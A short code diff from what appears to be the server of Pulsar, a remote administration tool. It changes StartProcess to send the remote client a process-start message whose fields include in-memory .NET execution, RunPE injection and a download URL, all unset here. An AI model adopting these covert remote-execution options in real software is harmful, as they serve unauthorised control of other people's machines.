@@ -13,7 +13,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Threading;
-
+using Pulsar.Common.Messages.Administration.TaskManager;
 namespace Pulsar.Server.Messages
 {
     /// <summary>
@@ -482,8 +482,19 @@ namespace Pulsar.Server.Messages
         /// <param name="remotePath">The remote path used for starting the new process.</param>
         public void StartProcess(string remotePath)
         {
-            _taskManagerHandler.StartProcess(remotePath);
+            _client.Send(new DoProcessStart
+            {
+                FilePath = remotePath,
+                IsFromFileManager = true,
+                ExecuteInMemoryDotNet = false,
+                UseRunPE = false,
+                IsUpdate = false,
+                FileBytes = null,
+                DownloadUrl = null
+            });
         }
+
+
 
         /// <summary>
         /// Adds an item to the startup of the client.
